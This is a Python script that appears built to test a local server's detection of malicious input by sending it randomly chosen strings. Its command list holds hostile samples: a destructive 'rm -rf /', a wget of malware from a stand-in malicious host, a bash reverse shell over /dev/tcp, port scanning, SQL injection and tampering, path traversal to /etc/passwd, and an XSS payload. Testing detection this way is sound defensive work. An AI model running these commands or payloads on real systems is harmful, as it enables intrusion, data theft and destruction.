"""
Client script for simulating attacks against a server.

This script connects to a specified server and sends a random sequence of commands,
including potential attack commands and harmless messages. The purpose is to test
the server's ability to detect and categorize malicious commands.
"""
import socket
import time
import random
import string

# Configuration
SERVER_IP = '127.0.0.1'  # Server IP address
SERVER_PORT = 5000       # Server port number
ATTACK_DURATION = 60     # Duration of the attack simulation in seconds
# List of potential attack commands
COMMANDS = [
    'ls', 'pwd', 'echo $PATH', 'rm -rf /', 'wget http://malicious.com/malware.sh',
    'nc -zv 192.168.1.1 1-100', '/bin/bash -i > /dev/tcp/192.168.1.1/8080 0<&1 2>&1',
    'UPDATE users SET password = "hacked" WHERE id = 1;',
    'INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");',
    'netstat', 'telnet 192.168.0.1 25', '../etc/passwd', 'admin\' OR 1=1 --',
    '<script>alert("XSS")</script>'
]
MAX_HARMLESS_MSG_LENGTH = 25  # Maximum length of harmless messages


def generate_command():
    """Randomly choose a command from the list."""
    return random.choice(COMMANDS)


def generate_harmless_message(max_length=MAX_HARMLESS_MSG_LENGTH):
    """Generate a harmless message with a specified maximum length."""
    length = random.randint(1, max_length)
    characters = string.ascii_letters + string.digits
    message = ''.join(random.choice(characters) for _ in range(length))
    return message


def random_interval():
    """Generate a random interval to mimic human behavior."""
    return random.uniform(0.5, 3.0)  # Between 0.5 and 3 seconds


def run_attack(sock, num_attacks):
    """Run the attack simulation for the given number of attacks."""
    if num_attacks == 0:
        harmless_msg = generate_harmless_message()
        sock.sendall(harmless_msg.encode('utf-8'))
        print(f"Sent: {harmless_msg}")
    else:
        for _ in range(num_attacks):
            cmd = generate_command()
            sock.sendall(cmd.encode('utf-8'))
            print(f"Sent: {cmd}")
            time.sleep(random_interval())


def main():
    """
    Run the attack simulation.

    This function controls the overall attack simulation process. It randomly selects
    the number of connections to open (between 5 and 7) and, for each connection, it
    randomly determines the number of attacks to send (between 0 and 2). The simulation
    runs for the specified duration (ATTACK_DURATION), and the total attack duration
    is printed at the end.
    """
    start_time = time.time()
    num_connections = random.randint(5, 7)  # Random number of connections
    print(
        f"Launching Sim Attack at {start_time}.\nUsing a total number of {num_connections} independent connections")

    for _ in range(num_connections):
        # Random number of attacks per connection
        num_attacks = random.randint(0, 2)
        print(
            f"Sim Attack number: {_}.\nWith {num_attacks} number of attacks to send.")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((SERVER_IP, SERVER_PORT))
            run_attack(sock, num_attacks)

    end_time = time.time()
    attack_duration = end_time - start_time
    print(f"Attack simulation completed in {attack_duration:.2f} seconds.")


if __name__ == "__main__":
    main()
